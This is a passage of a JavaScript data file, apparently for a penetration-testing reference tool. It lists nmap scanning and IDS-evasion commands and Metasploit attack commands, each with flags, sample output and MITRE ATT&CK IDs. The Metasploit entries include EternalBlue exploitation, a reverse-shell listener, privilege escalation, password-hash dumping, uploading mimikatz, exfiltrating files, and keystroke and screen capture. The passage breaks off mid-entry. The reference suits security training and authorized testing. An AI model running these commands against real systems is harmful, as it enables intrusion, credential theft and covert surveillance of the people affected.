// Security Commands Encyclopedia — comprehensive command reference for ethical penetration testing
// Organized by tool, each entry: { tool, command, description, flags, example, category, mitre }

export const SECURITY_COMMANDS_ENCYCLOPEDIA = {

  // ═══════════════════════════════════════════════════════════════════════════
  // NMAP — Network Mapper
  // ═══════════════════════════════════════════════════════════════════════════
  nmap: [
    {
      tool: "nmap",
      command: "nmap -sS <target>",
      description: "TCP SYN scan (stealth scan). Sends SYN packets and analyzes responses without completing the TCP handshake. Default scan type when run as root.",
      flags: { "-sS": "SYN scan — sends SYN, receives SYN/ACK (open) or RST (closed), never completes handshake" },
      example: "nmap -sS 192.168.1.0/24\n# Starting Nmap 7.94 ( https://nmap.org )\n# Nmap scan report for 192.168.1.1\n# PORT    STATE SERVICE\n# 22/tcp  open  ssh\n# 80/tcp  open  http\n# 443/tcp open  https",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -sT <target>",
      description: "TCP connect scan. Completes the full TCP three-way handshake. Used when SYN scan is not available (non-root). More detectable but more reliable.",
      flags: { "-sT": "TCP connect scan — completes full handshake, logged by target" },
      example: "nmap -sT 10.10.10.5\n# PORT    STATE SERVICE\n# 21/tcp  open  ftp\n# 22/tcp  open  ssh\n# 80/tcp  open  http",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -sU <target>",
      description: "UDP scan. Sends UDP packets to discover open UDP services. Slower than TCP scans due to lack of handshake mechanism.",
      flags: { "-sU": "UDP scan — sends empty UDP packets, ICMP port unreachable means closed" },
      example: "nmap -sU --top-ports 20 10.10.10.5\n# PORT     STATE         SERVICE\n# 53/udp   open          domain\n# 67/udp   open|filtered dhcps\n# 123/udp  open          ntp\n# 161/udp  open          snmp",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -sA <target>",
      description: "TCP ACK scan. Used to map firewall rulesets, determining which ports are filtered. Does not determine open ports.",
      flags: { "-sA": "ACK scan — sends ACK packets, unfiltered ports respond with RST" },
      example: "nmap -sA 10.10.10.5\n# PORT    STATE      SERVICE\n# 22/tcp  unfiltered ssh\n# 80/tcp  unfiltered http\n# 443/tcp filtered   https",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -sW <target>",
      description: "TCP Window scan. Like ACK scan but examines the TCP Window field of RST packets to differentiate open from closed ports on some systems.",
      flags: { "-sW": "Window scan — examines RST window size to determine port state" },
      example: "nmap -sW 10.10.10.5",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -sN <target>",
      description: "TCP Null scan. Sends packets with no TCP flags set. Open ports should not respond; closed ports send RST. Evades some firewalls.",
      flags: { "-sN": "Null scan — no flags set, exploits RFC 793 compliance" },
      example: "nmap -sN 10.10.10.5",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -sF <target>",
      description: "TCP FIN scan. Sends packets with only FIN flag set. Like Null scan, exploits RFC 793 to bypass certain firewalls.",
      flags: { "-sF": "FIN scan — only FIN flag set" },
      example: "nmap -sF 10.10.10.5",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -sX <target>",
      description: "TCP Xmas scan. Sends packets with FIN, PSH, and URG flags set (lit up like a Christmas tree). Stealthy against non-RFC-compliant stacks.",
      flags: { "-sX": "Xmas scan — FIN+PSH+URG flags set" },
      example: "nmap -sX 10.10.10.5",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -sM <target>",
      description: "TCP Maimon scan. Sends FIN/ACK probe. Named after Uriel Maimon who discovered some systems drop RST for open ports.",
      flags: { "-sM": "Maimon scan — FIN+ACK flags, some BSD systems respond differently for open ports" },
      example: "nmap -sM 10.10.10.5",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -sn <target>",
      description: "Ping scan / host discovery only. No port scan — just determines which hosts are alive using ICMP echo, TCP SYN to 443, TCP ACK to 80, and ICMP timestamp.",
      flags: { "-sn": "Ping scan only — skip port scanning" },
      example: "nmap -sn 192.168.1.0/24\n# Nmap scan report for 192.168.1.1\n# Host is up (0.0012s latency).\n# Nmap scan report for 192.168.1.50\n# Host is up (0.0089s latency).\n# Nmap done: 256 IP addresses (12 hosts up)",
      category: "Discovery",
      mitre: "T1018"
    },
    {
      tool: "nmap",
      command: "nmap -Pn <target>",
      description: "Skip host discovery and treat all hosts as online. Essential when ICMP is blocked by firewall.",
      flags: { "-Pn": "Treat all hosts as online — skip ping discovery" },
      example: "nmap -Pn 10.10.10.5",
      category: "Discovery",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -PS22,80,443 <target>",
      description: "TCP SYN ping discovery. Sends SYN packets to specified ports to determine if host is alive.",
      flags: { "-PS": "TCP SYN ping — specify ports for discovery probes" },
      example: "nmap -PS22,80,443 10.10.10.0/24",
      category: "Discovery",
      mitre: "T1018"
    },
    {
      tool: "nmap",
      command: "nmap -PA80,443 <target>",
      description: "TCP ACK ping discovery. Sends ACK packets for host discovery. Useful when SYN pings are blocked.",
      flags: { "-PA": "TCP ACK ping — ACK-based host discovery" },
      example: "nmap -PA80,443 10.10.10.0/24",
      category: "Discovery",
      mitre: "T1018"
    },
    {
      tool: "nmap",
      command: "nmap -PU53,161 <target>",
      description: "UDP ping discovery. Sends UDP packets to specified ports. Closed ports return ICMP port unreachable, confirming host is alive.",
      flags: { "-PU": "UDP ping — discovery via UDP probes" },
      example: "nmap -PU53,161 10.10.10.0/24",
      category: "Discovery",
      mitre: "T1018"
    },
    {
      tool: "nmap",
      command: "nmap -PE <target>",
      description: "ICMP echo ping discovery. Standard ping — sends ICMP echo request.",
      flags: { "-PE": "ICMP echo request ping" },
      example: "nmap -PE 10.10.10.0/24",
      category: "Discovery",
      mitre: "T1018"
    },
    {
      tool: "nmap",
      command: "nmap -PP <target>",
      description: "ICMP timestamp ping discovery. Alternative to echo ping when echo is blocked.",
      flags: { "-PP": "ICMP timestamp request ping" },
      example: "nmap -PP 10.10.10.0/24",
      category: "Discovery",
      mitre: "T1018"
    },
    {
      tool: "nmap",
      command: "nmap -PM <target>",
      description: "ICMP address mask ping discovery. Sends ICMP address mask request as discovery probe.",
      flags: { "-PM": "ICMP address mask request ping" },
      example: "nmap -PM 10.10.10.0/24",
      category: "Discovery",
      mitre: "T1018"
    },
    {
      tool: "nmap",
      command: "nmap -sV <target>",
      description: "Service version detection. Probes open ports to determine service/version info by sending specific protocol probes.",
      flags: { "-sV": "Version detection — interrogate open ports for service info" },
      example: "nmap -sV 10.10.10.5\n# PORT    STATE SERVICE VERSION\n# 22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5\n# 80/tcp  open  http    Apache httpd 2.4.41\n# 3306/tcp open mysql   MySQL 5.7.38",
      category: "Enumeration",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -sV --version-intensity 5 <target>",
      description: "Service version detection with intensity level. Range 0-9, higher sends more probes for accuracy but takes longer.",
      flags: { "--version-intensity": "Set probe intensity 0 (light) to 9 (all probes)" },
      example: "nmap -sV --version-intensity 9 10.10.10.5",
      category: "Enumeration",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -O <target>",
      description: "OS detection. Analyzes TCP/IP stack fingerprint to determine the target operating system.",
      flags: { "-O": "Enable OS detection via TCP/IP fingerprinting" },
      example: "nmap -O 10.10.10.5\n# OS details: Linux 4.15 - 5.6",
      category: "Enumeration",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -O --osscan-guess <target>",
      description: "OS detection with aggressive guessing. When exact match not found, provides closest matches.",
      flags: { "--osscan-guess": "Guess OS more aggressively when exact match unavailable" },
      example: "nmap -O --osscan-guess 10.10.10.5",
      category: "Enumeration",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -A <target>",
      description: "Aggressive scan. Enables OS detection (-O), version detection (-sV), script scanning (-sC), and traceroute (--traceroute).",
      flags: { "-A": "Aggressive — combines -O -sV -sC --traceroute" },
      example: "nmap -A 10.10.10.5",
      category: "Enumeration",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -T0 <target>",
      description: "Paranoid timing template. Extremely slow scan with 5-minute delay between probes. For IDS evasion.",
      flags: { "-T0": "Paranoid — serialized scanning, 5min between probes" },
      example: "nmap -T0 10.10.10.5",
      category: "Evasion",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -T1 <target>",
      description: "Sneaky timing template. 15-second delay between probes. For IDS evasion.",
      flags: { "-T1": "Sneaky — 15s between probes" },
      example: "nmap -T1 10.10.10.5",
      category: "Evasion",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -T2 <target>",
      description: "Polite timing template. Slows scan to consume less bandwidth and target resources.",
      flags: { "-T2": "Polite — slower than default, less bandwidth" },
      example: "nmap -T2 10.10.10.5",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -T3 <target>",
      description: "Normal timing template (default). Balances speed and stealth.",
      flags: { "-T3": "Normal — default timing" },
      example: "nmap -T3 10.10.10.5",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -T4 <target>",
      description: "Aggressive timing template. Faster scan, assumes reasonably fast and reliable network.",
      flags: { "-T4": "Aggressive — faster, suitable for LAN/fast WAN" },
      example: "nmap -T4 -A 10.10.10.5",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -T5 <target>",
      description: "Insane timing template. Fastest scan, may miss open ports. Only for very fast networks.",
      flags: { "-T5": "Insane — sacrifice accuracy for speed" },
      example: "nmap -T5 10.10.10.5",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap --script vuln <target>",
      description: "Run all NSE vulnerability detection scripts against target.",
      flags: { "--script": "Run specified NSE scripts", "vuln": "Category of vulnerability detection scripts" },
      example: "nmap --script vuln 10.10.10.5\n# | smb-vuln-ms17-010:\n# |   VULNERABLE:\n# |   Remote Code Execution vulnerability in Microsoft SMBv1\n# |     Risk factor: HIGH\n# |     CVE: CVE-2017-0143",
      category: "Vulnerability Assessment",
      mitre: "T1595.002"
    },
    {
      tool: "nmap",
      command: "nmap --script=http-enum <target>",
      description: "HTTP enumeration script. Discovers directories, files, and web applications on web servers.",
      flags: { "--script=http-enum": "Enumerate web directories and files" },
      example: "nmap --script=http-enum -p 80,443 10.10.10.5\n# | http-enum:\n# |   /admin/: Admin panel\n# |   /robots.txt: Robots file\n# |   /phpmyadmin/: phpMyAdmin",
      category: "Enumeration",
      mitre: "T1595.003"
    },
    {
      tool: "nmap",
      command: "nmap --script=smb-enum-shares,smb-enum-users <target>",
      description: "Enumerate SMB shares and users on a Windows target.",
      flags: { "--script=smb-enum-shares": "List SMB file shares", "smb-enum-users": "Enumerate SMB users" },
      example: "nmap --script=smb-enum-shares,smb-enum-users -p 445 10.10.10.5\n# | smb-enum-shares:\n# |   \\\\10.10.10.5\\ADMIN$: Type: STYPE_DISKTREE_HIDDEN\n# |   \\\\10.10.10.5\\C$: Type: STYPE_DISKTREE_HIDDEN\n# |   \\\\10.10.10.5\\share: Type: STYPE_DISKTREE",
      category: "Enumeration",
      mitre: "T1135"
    },
    {
      tool: "nmap",
      command: "nmap --script=dns-brute <target>",
      description: "DNS brute force enumeration. Attempts to find valid subdomains by brute-forcing common names.",
      flags: { "--script=dns-brute": "Brute force DNS subdomains" },
      example: "nmap --script=dns-brute example.com\n# | dns-brute:\n# |   DNS Brute-force hostnames:\n# |     www.example.com - 93.184.216.34\n# |     mail.example.com - 93.184.216.35\n# |     api.example.com - 93.184.216.36",
      category: "Enumeration",
      mitre: "T1595.003"
    },
    {
      tool: "nmap",
      command: "nmap --script=ftp-anon <target>",
      description: "Check for anonymous FTP login. Tests if FTP server allows anonymous access.",
      flags: { "--script=ftp-anon": "Test for anonymous FTP login" },
      example: "nmap --script=ftp-anon -p 21 10.10.10.5\n# | ftp-anon: Anonymous FTP login allowed",
      category: "Enumeration",
      mitre: "T1078.001"
    },
    {
      tool: "nmap",
      command: "nmap --script=ssh-brute <target>",
      description: "SSH brute force login attempts using default credentials.",
      flags: { "--script=ssh-brute": "Brute force SSH credentials" },
      example: "nmap --script=ssh-brute -p 22 10.10.10.5",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "nmap",
      command: "nmap --script=ssl-heartbleed <target>",
      description: "Test for OpenSSL Heartbleed vulnerability (CVE-2014-0160).",
      flags: { "--script=ssl-heartbleed": "Check for Heartbleed vulnerability" },
      example: "nmap --script=ssl-heartbleed -p 443 10.10.10.5\n# | ssl-heartbleed:\n# |   VULNERABLE:\n# |   The Heartbleed Bug is a serious vulnerability in OpenSSL",
      category: "Vulnerability Assessment",
      mitre: "T1190"
    },
    {
      tool: "nmap",
      command: "nmap --script=smb-vuln-ms17-010 <target>",
      description: "Check for EternalBlue vulnerability (MS17-010) in SMBv1.",
      flags: { "--script=smb-vuln-ms17-010": "Test for EternalBlue/MS17-010" },
      example: "nmap --script=smb-vuln-ms17-010 -p 445 10.10.10.5",
      category: "Vulnerability Assessment",
      mitre: "T1210"
    },
    {
      tool: "nmap",
      command: "nmap --script=ssl-enum-ciphers <target>",
      description: "Enumerate SSL/TLS cipher suites and grade their strength.",
      flags: { "--script=ssl-enum-ciphers": "List and grade SSL/TLS ciphers" },
      example: "nmap --script=ssl-enum-ciphers -p 443 10.10.10.5",
      category: "Assessment",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap --script=http-title <target>",
      description: "Retrieve and display the HTML title of web pages.",
      flags: { "--script=http-title": "Get HTML page titles" },
      example: "nmap --script=http-title -p 80,443,8080 10.10.10.0/24",
      category: "Enumeration",
      mitre: "T1595.002"
    },
    {
      tool: "nmap",
      command: "nmap --script=http-headers <target>",
      description: "Retrieve HTTP response headers for security analysis.",
      flags: { "--script=http-headers": "Display HTTP response headers" },
      example: "nmap --script=http-headers -p 80 10.10.10.5",
      category: "Enumeration",
      mitre: "T1595.002"
    },
    {
      tool: "nmap",
      command: "nmap --script=http-sql-injection <target>",
      description: "Spider web server looking for URLs vulnerable to SQL injection.",
      flags: { "--script=http-sql-injection": "Test for SQL injection in URLs" },
      example: "nmap --script=http-sql-injection -p 80 10.10.10.5",
      category: "Vulnerability Assessment",
      mitre: "T1190"
    },
    {
      tool: "nmap",
      command: "nmap --script=http-shellshock <target>",
      description: "Test web server for Shellshock vulnerability (CVE-2014-6271) in CGI scripts.",
      flags: { "--script=http-shellshock": "Test for Shellshock in CGI", "--script-args": "uri=/cgi-bin/test.cgi to specify CGI path" },
      example: "nmap --script=http-shellshock --script-args uri=/cgi-bin/status -p 80 10.10.10.5",
      category: "Vulnerability Assessment",
      mitre: "T1190"
    },
    {
      tool: "nmap",
      command: "nmap -oN output.txt <target>",
      description: "Save scan results in normal text format.",
      flags: { "-oN": "Normal output to file" },
      example: "nmap -sV -oN scan_results.txt 10.10.10.5",
      category: "Output",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -oX output.xml <target>",
      description: "Save scan results in XML format. Useful for parsing and importing into other tools.",
      flags: { "-oX": "XML output to file" },
      example: "nmap -sV -oX scan_results.xml 10.10.10.5",
      category: "Output",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -oG output.gnmap <target>",
      description: "Save scan results in grepable format. Easy to parse with grep/awk/sed.",
      flags: { "-oG": "Grepable output to file" },
      example: "nmap -sV -oG scan_results.gnmap 10.10.10.5\n# grep 'open' scan_results.gnmap",
      category: "Output",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -oA output_prefix <target>",
      description: "Save scan results in all three formats (normal, XML, grepable) simultaneously.",
      flags: { "-oA": "Output in all formats — creates .nmap, .xml, .gnmap files" },
      example: "nmap -sV -oA full_scan 10.10.10.5",
      category: "Output",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -f <target>",
      description: "Fragment packets. Splits IP packets into 8-byte fragments to evade packet inspection firewalls and IDS.",
      flags: { "-f": "Fragment packets into 8-byte chunks" },
      example: "nmap -f -sS 10.10.10.5",
      category: "Evasion",
      mitre: "T1205"
    },
    {
      tool: "nmap",
      command: "nmap --mtu 24 <target>",
      description: "Set custom MTU size for packet fragmentation. Must be a multiple of 8.",
      flags: { "--mtu": "Set custom maximum transmission unit (multiple of 8)" },
      example: "nmap --mtu 24 -sS 10.10.10.5",
      category: "Evasion",
      mitre: "T1205"
    },
    {
      tool: "nmap",
      command: "nmap -D RND:5 <target>",
      description: "Decoy scan. Spoofs additional source addresses to hide the real scanner among decoys.",
      flags: { "-D": "Decoy scan — RND:5 generates 5 random decoy IPs" },
      example: "nmap -D RND:10 -sS 10.10.10.5",
      category: "Evasion",
      mitre: "T1205"
    },
    {
      tool: "nmap",
      command: "nmap --source-port 53 <target>",
      description: "Spoof source port. Some firewalls allow traffic from trusted ports like DNS (53) or HTTP (80).",
      flags: { "--source-port": "Set source port number for scan packets" },
      example: "nmap --source-port 53 -sS 10.10.10.5",
      category: "Evasion",
      mitre: "T1205"
    },
    {
      tool: "nmap",
      command: "nmap --data-length 25 <target>",
      description: "Append random data to packets. Changes packet size to evade signature-based detection.",
      flags: { "--data-length": "Append N random bytes to packets" },
      example: "nmap --data-length 50 -sS 10.10.10.5",
      category: "Evasion",
      mitre: "T1205"
    },
    {
      tool: "nmap",
      command: "nmap --scan-delay 5s <target>",
      description: "Add delay between probes. Evades rate-based IDS/IPS detection.",
      flags: { "--scan-delay": "Minimum delay between probes" },
      example: "nmap --scan-delay 5s -sS 10.10.10.5",
      category: "Evasion",
      mitre: "T1205"
    },
    {
      tool: "nmap",
      command: "nmap -p- <target>",
      description: "Scan all 65535 TCP ports. Thorough but time-consuming.",
      flags: { "-p-": "Scan all ports (1-65535)" },
      example: "nmap -p- -T4 10.10.10.5",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -p 21,22,80,443,3306,8080 <target>",
      description: "Scan specific ports only.",
      flags: { "-p": "Specify port numbers or ranges" },
      example: "nmap -p 21,22,80,443,3306,8080 10.10.10.5",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap --top-ports 1000 <target>",
      description: "Scan the top N most common ports based on nmap-services frequency data.",
      flags: { "--top-ports": "Scan N most common ports" },
      example: "nmap --top-ports 100 10.10.10.0/24",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -sS -sV -sC -O -T4 -p- -oA full_scan <target>",
      description: "Comprehensive full scan. SYN scan all ports with version detection, default scripts, and OS detection.",
      flags: { "-sS": "SYN scan", "-sV": "Version detection", "-sC": "Default scripts", "-O": "OS detection", "-T4": "Aggressive timing", "-p-": "All ports" },
      example: "nmap -sS -sV -sC -O -T4 -p- -oA full_scan 10.10.10.5",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap -sV --script=banner <target>",
      description: "Grab service banners from open ports for fingerprinting.",
      flags: { "--script=banner": "Grab banners from services" },
      example: "nmap -sV --script=banner -p 21,22,25,80 10.10.10.5",
      category: "Enumeration",
      mitre: "T1046"
    },
    {
      tool: "nmap",
      command: "nmap --script=smb-os-discovery <target>",
      description: "Discover OS, domain, and workgroup information via SMB.",
      flags: { "--script=smb-os-discovery": "SMB OS discovery" },
      example: "nmap --script=smb-os-discovery -p 445 10.10.10.5\n# | smb-os-discovery:\n# |   OS: Windows Server 2019 Standard 17763\n# |   Computer name: DC01\n# |   Domain name: corp.local",
      category: "Enumeration",
      mitre: "T1046"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // METASPLOIT FRAMEWORK
  // ═══════════════════════════════════════════════════════════════════════════
  metasploit: [
    {
      tool: "metasploit",
      command: "msfconsole",
      description: "Launch the Metasploit Framework console — the primary interface for exploitation.",
      flags: { "-q": "Quiet mode — skip banner", "-r": "Execute resource script on startup", "-x": "Execute command string on startup" },
      example: "msfconsole -q\nmsf6 >",
      category: "Setup",
      mitre: "T1588.002"
    },
    {
      tool: "metasploit",
      command: "use exploit/windows/smb/ms17_010_eternalblue",
      description: "Load the EternalBlue exploit module targeting CVE-2017-0143 in SMBv1.",
      flags: { "use": "Select a module by path" },
      example: "msf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.5\nmsf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.2\nmsf6 exploit(ms17_010_eternalblue) > exploit",
      category: "Exploitation",
      mitre: "T1210"
    },
    {
      tool: "metasploit",
      command: "use exploit/multi/handler",
      description: "Multi-handler for catching reverse shells and bind connections from any payload.",
      flags: { "set PAYLOAD": "Specify payload to catch", "set LHOST": "Listening IP", "set LPORT": "Listening port" },
      example: "msf6 > use exploit/multi/handler\nmsf6 > set PAYLOAD windows/meterpreter/reverse_tcp\nmsf6 > set LHOST 10.10.14.2\nmsf6 > set LPORT 4444\nmsf6 > exploit -j",
      category: "Exploitation",
      mitre: "T1059"
    },
    {
      tool: "metasploit",
      command: "use exploit/windows/local/always_install_elevated",
      description: "Exploit AlwaysInstallElevated policy to escalate privileges via MSI packages.",
      flags: { "set SESSION": "Meterpreter session to escalate" },
      example: "msf6 > use exploit/windows/local/always_install_elevated\nmsf6 > set SESSION 1\nmsf6 > exploit",
      category: "Privilege Escalation",
      mitre: "T1548.002"
    },
    {
      tool: "metasploit",
      command: "use exploit/linux/local/cve_2021_4034_pwnkit",
      description: "PwnKit exploit — local privilege escalation via pkexec (CVE-2021-4034).",
      flags: { "set SESSION": "Active session to escalate" },
      example: "msf6 > use exploit/linux/local/cve_2021_4034_pwnkit\nmsf6 > set SESSION 1\nmsf6 > exploit",
      category: "Privilege Escalation",
      mitre: "T1068"
    },
    {
      tool: "metasploit",
      command: "use auxiliary/scanner/smb/smb_ms17_010",
      description: "Scan for MS17-010 (EternalBlue) vulnerability without exploiting.",
      flags: { "set RHOSTS": "Target range to scan" },
      example: "msf6 > use auxiliary/scanner/smb/smb_ms17_010\nmsf6 > set RHOSTS 10.10.10.0/24\nmsf6 > run",
      category: "Vulnerability Assessment",
      mitre: "T1046"
    },
    {
      tool: "metasploit",
      command: "use auxiliary/scanner/http/dir_scanner",
      description: "HTTP directory brute force scanner.",
      flags: { "set RHOSTS": "Target web server", "set DICTIONARY": "Wordlist file path" },
      example: "msf6 > use auxiliary/scanner/http/dir_scanner\nmsf6 > set RHOSTS 10.10.10.5\nmsf6 > run",
      category: "Enumeration",
      mitre: "T1595.003"
    },
    {
      tool: "metasploit",
      command: "use auxiliary/scanner/ssh/ssh_login",
      description: "SSH brute force login scanner. Tests username/password combinations.",
      flags: { "set RHOSTS": "Target SSH server", "set USERNAME": "Username or file", "set PASS_FILE": "Password wordlist" },
      example: "msf6 > use auxiliary/scanner/ssh/ssh_login\nmsf6 > set RHOSTS 10.10.10.5\nmsf6 > set USERNAME root\nmsf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt\nmsf6 > run",
      category: "Credential Access",
      mitre: "T1110.001"
    },
    {
      tool: "metasploit",
      command: "use auxiliary/scanner/ftp/ftp_anonymous",
      description: "Check FTP servers for anonymous login access.",
      flags: { "set RHOSTS": "Target range" },
      example: "msf6 > use auxiliary/scanner/ftp/ftp_anonymous\nmsf6 > set RHOSTS 10.10.10.0/24\nmsf6 > run",
      category: "Enumeration",
      mitre: "T1078.001"
    },
    {
      tool: "metasploit",
      command: "use auxiliary/scanner/smb/smb_enumshares",
      description: "Enumerate available SMB shares on target systems.",
      flags: { "set RHOSTS": "Target range", "set SMBUser": "Username", "set SMBPass": "Password" },
      example: "msf6 > use auxiliary/scanner/smb/smb_enumshares\nmsf6 > set RHOSTS 10.10.10.5\nmsf6 > run",
      category: "Enumeration",
      mitre: "T1135"
    },
    {
      tool: "metasploit",
      command: "use auxiliary/scanner/snmp/snmp_enum",
      description: "Enumerate system information via SNMP community strings.",
      flags: { "set RHOSTS": "Target", "set COMMUNITY": "SNMP community string" },
      example: "msf6 > use auxiliary/scanner/snmp/snmp_enum\nmsf6 > set RHOSTS 10.10.10.5\nmsf6 > set COMMUNITY public\nmsf6 > run",
      category: "Enumeration",
      mitre: "T1046"
    },
    {
      tool: "metasploit",
      command: "use post/windows/gather/hashdump",
      description: "Dump password hashes from SAM database on compromised Windows host.",
      flags: { "set SESSION": "Active meterpreter session" },
      example: "msf6 > use post/windows/gather/hashdump\nmsf6 > set SESSION 1\nmsf6 > run\n# Administrator:500:aad3b435...:31d6cfe0...\n# Guest:501:aad3b435...:31d6cfe0...",
      category: "Credential Access",
      mitre: "T1003.002"
    },
    {
      tool: "metasploit",
      command: "use post/multi/recon/local_exploit_suggester",
      description: "Analyze compromised target and suggest applicable local exploits for privilege escalation.",
      flags: { "set SESSION": "Active session to analyze" },
      example: "msf6 > use post/multi/recon/local_exploit_suggester\nmsf6 > set SESSION 1\nmsf6 > run\n# [+] exploit/windows/local/ms16_075_reflection_juicy\n# [+] exploit/windows/local/always_install_elevated",
      category: "Privilege Escalation",
      mitre: "T1068"
    },
    {
      tool: "metasploit",
      command: "use post/windows/manage/migrate",
      description: "Migrate meterpreter process to another process for stability and persistence.",
      flags: { "set SESSION": "Active session", "set PID": "Target process ID" },
      example: "msf6 > use post/windows/manage/migrate\nmsf6 > set SESSION 1\nmsf6 > set PID 3456\nmsf6 > run",
      category: "Defense Evasion",
      mitre: "T1055"
    },
    {
      tool: "metasploit",
      command: "use post/windows/gather/credentials/credential_collector",
      description: "Collect stored credentials from various Windows credential stores.",
      flags: { "set SESSION": "Active session" },
      example: "msf6 > use post/windows/gather/credentials/credential_collector\nmsf6 > set SESSION 1\nmsf6 > run",
      category: "Credential Access",
      mitre: "T1555"
    },
    {
      tool: "metasploit",
      command: "meterpreter > sysinfo",
      description: "Display system information of compromised host.",
      flags: {},
      example: "meterpreter > sysinfo\nComputer        : DC01\nOS              : Windows Server 2019 (10.0 Build 17763)\nArchitecture    : x64\nMeterpreter     : x64/windows",
      category: "Enumeration",
      mitre: "T1082"
    },
    {
      tool: "metasploit",
      command: "meterpreter > getuid",
      description: "Display the user the meterpreter server is running as.",
      flags: {},
      example: "meterpreter > getuid\nServer username: CORP\\Administrator",
      category: "Enumeration",
      mitre: "T1033"
    },
    {
      tool: "metasploit",
      command: "meterpreter > getsystem",
      description: "Attempt to escalate to SYSTEM privileges using multiple techniques (named pipe impersonation, token duplication).",
      flags: {},
      example: "meterpreter > getsystem\n...got system via technique 1 (Named Pipe Impersonation)",
      category: "Privilege Escalation",
      mitre: "T1134"
    },
    {
      tool: "metasploit",
      command: "meterpreter > hashdump",
      description: "Dump SAM database hashes directly from meterpreter session.",
      flags: {},
      example: "meterpreter > hashdump\nAdministrator:500:aad3b435b51404ee:31d6cfe0d16ae931:::\nGuest:501:aad3b435b51404ee:31d6cfe0d16ae931:::",
      category: "Credential Access",
      mitre: "T1003.002"
    },
    {
      tool: "metasploit",
      command: "meterpreter > shell",
      description: "Drop into an interactive system command shell.",
      flags: {},
      example: "meterpreter > shell\nProcess 4532 created.\nChannel 1 created.\nC:\\Windows\\system32>",
      category: "Execution",
      mitre: "T1059.003"
    },
    {
      tool: "metasploit",
      command: "meterpreter > upload /path/to/local/file C:\\\\remote\\\\path",
      description: "Upload a file from attacker machine to compromised target.",
      flags: {},
      example: "meterpreter > upload /tmp/mimikatz.exe C:\\\\Windows\\\\Temp\\\\mimi.exe\n[*] uploading  : /tmp/mimikatz.exe -> C:\\Windows\\Temp\\mimi.exe\n[*] uploaded   : /tmp/mimikatz.exe -> C:\\Windows\\Temp\\mimi.exe",
      category: "Lateral Movement",
      mitre: "T1105"
    },
    {
      tool: "metasploit",
      command: "meterpreter > download C:\\\\Users\\\\admin\\\\Desktop\\\\secret.txt",
      description: "Download a file from compromised target to attacker machine.",
      flags: {},
      example: "meterpreter > download C:\\\\Users\\\\admin\\\\Desktop\\\\secret.txt\n[*] Downloading: C:\\Users\\admin\\Desktop\\secret.txt -> secret.txt\n[*] Downloaded 1.2KiB",
      category: "Collection",
      mitre: "T1005"
    },
    {
      tool: "metasploit",
      command: "meterpreter > portfwd add -l 8080 -p 80 -r 172.16.0.10",
      description: "Set up port forwarding through meterpreter to access internal network services.",
      flags: { "-l": "Local port to listen on", "-p": "Remote port to forward to", "-r": "Remote host to forward to" },
      example: "meterpreter > portfwd add -l 8080 -p 80 -r 172.16.0.10\n[*] Forward TCP relay created: (local) :8080 -> (remote) 172.16.0.10:80",
      category: "Pivoting",
      mitre: "T1090"
    },
    {
      tool: "metasploit",
      command: "meterpreter > route add 172.16.0.0/24 <session_id>",
      description: "Add route through meterpreter session to reach internal subnets.",
      flags: {},
      example: "msf6 > route add 172.16.0.0 255.255.255.0 1\n[*] Route added",
      category: "Pivoting",
      mitre: "T1090"
    },
    {
      tool: "metasploit",
      command: "meterpreter > keyscan_start",
      description: "Start capturing keystrokes on the compromised system.",
      flags: {},
      example: "meterpreter > keyscan_start\nStarting the keystroke sniffer ...\nmeterpreter > keyscan_dump\nDumping captured keystrokes...\nadmin<Tab>P@ssw0rd123<Return>",
      category: "Collection",
      mitre: "T1056.001"
    },
    {
      tool: "metasploit",
      command: "meterpreter > screenshot",
      description: "Take a screenshot of the compromised system's current desktop.",
      flags: {},
      example: "meterpreter > screenshot\nScreenshot saved to: /root/screenshot.jpeg",
      category: "Collection",
      mitre: "T1113"
    },
    {
      tool: "metasploit",
      command: "meterpreter > webcam_snap",
      description: "Capture an image from the target's webcam.",
